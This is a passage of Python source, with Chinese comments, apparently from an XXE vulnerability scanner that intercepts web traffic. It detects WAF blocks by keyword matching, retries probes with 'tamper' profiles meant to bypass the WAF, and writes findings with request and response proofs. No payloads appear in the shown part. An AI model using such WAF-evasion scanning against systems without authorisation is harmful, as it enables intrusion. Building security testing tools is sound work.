        for keyword in rules.get("header_keywords", []):
            if keyword.lower() in headers_text:
                reasons.append(f"header:{keyword}")

        body_text = response.get("text", "")[:8000].lower()
        for keyword in rules.get("body_keywords", []):
            if keyword.lower() in body_text:
                reasons.append(f"body:{keyword}")

        return {"blocked": bool(reasons), "reasons": self.merge_reasons(reasons)}

    def iter_tamper_profiles(self, limit=None):
        """按 rules.yaml 顺序返回有限数量的 tamper 策略。"""
        count = 0
        if limit is None:
            limit = max_tampered_payloads_per_probe()
        if limit <= 0:
            return

        for profile in tamper_profiles():
            tampers = profile.get("tampers", [])
            if not tampers:
                continue
            yield {
                "name": profile.get("name") or "+".join(tampers),
                "tampers": tampers,
            }
            count += 1
            if count >= limit:
                break

    def annotate_probe(self, probe, sent_payload, tamper_profile, tampers,
                       waf_info, retry_reasons, deep_tamper=False):
        """给探测响应补充 payload 和 WAF 元信息。"""
        probe["sent_payload"] = sent_payload
        probe["tamper_profile"] = tamper_profile
        probe["tampers"] = list(tampers)
        probe["tamper_used"] = tamper_profile != "none"
        probe["waf_blocked"] = waf_info["blocked"]
        probe["waf_reasons"] = waf_info["reasons"]
        probe["waf_retry"] = bool(retry_reasons)
        probe["waf_retry_reasons"] = self.merge_reasons(retry_reasons)
        probe["deep_tamper"] = bool(deep_tamper)

    def tamper_evidence(self, probe):
        """生成漏洞结果里的 tamper 证据字段。"""
        if probe.get("waf_retry"):
            return {
                "waf_bypass": True,
                "tamper_profile": probe.get("tamper_profile"),
                "tampers": probe.get("tampers", []),
                "waf_reasons": probe.get("waf_retry_reasons", []),
            }
        if probe.get("deep_tamper"):
            return {
                "deep_tamper": True,
                "tamper_profile": probe.get("tamper_profile"),
                "tampers": probe.get("tampers", []),
            }
        return {}

    def deep_tamper_profile_limit(self):
        """非 WAF 场景下 deep tamper 的 profile 数量上限。full 模式返回 None = 用 rules 完整上限。"""
        if self.full_payload_scan:
            return None
        return self.deep_tamper_max_profiles

    def merge_reasons(self, *reason_lists):
        merged = []
        for reasons in reason_lists:
            for reason in reasons:
                if reason not in merged:
                    merged.append(reason)
        return merged[:8]

    # ------------------------------------------------------------------
    # 去重与结果
    # ------------------------------------------------------------------

    def make_scan_key(self, flow, target):
        request = flow.request
        parts = urlsplit(request.pretty_url)
        return (
            request.method.upper(),
            parts.scheme,
            parts.netloc,
            self.normalize_path_for_dedup(parts.path),
            target["place"],
            target["name"],
            target.get("index", ""),
        )

    def build_finding(self, flow, target, evidence, proof_probe=None, extra_probes=None):
        """生成统一漏洞结果结构。

        带内文件读取 + 带外解析统一为一种漏洞：type=method=xxe，报告里显示为“XXE”，
        具体检测方式看 evidence["technique"]。
        """
        request = flow.request
        finding = {
            "time": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()),
            "type": "xxe",
            "method": "xxe",
            "request_method": request.method,
            "url": request.pretty_url,
            "param_place": target["place"],
            "param_name": target["name"],
            "evidence": evidence,
            "proof": self.probe_to_proof(proof_probe),
            "extra_proofs": [],
        }
        for extra in extra_probes or []:
            proof = self.probe_to_proof(extra.get("probe"))
            proof["name"] = extra.get("name", "extra")
            finding["extra_proofs"].append(proof)
        return finding

    def probe_to_proof(self, probe):
        if not probe:
            return {"request": "", "response": ""}
        return {
            "request": probe.get("request_packet", ""),
            "response": probe.get("response_packet", ""),
        }

    def write_finding(self, finding):
        """把漏洞结果写入 JSON Lines，并更新 HTML 报告。"""
        write_jsonl(self.vuln_file, finding)
        print_finding_once(self, finding)
        if self.on_finding:
            self.on_finding(finding)
        write_html_report(self.vuln_file, self.report_file)

    def print_finding(self, finding):
        technique = finding.get("evidence", {}).get("technique", "")
        print(
            red(
                "[漏洞] "
                f"检测到 XXE[{technique}] | "
                f"{finding['param_place']}.{finding['param_name']} | "
                f"地址: {finding.get('url', '')} | "
                f"报告: {self.report_file}"
            ),
            flush=True,
        )
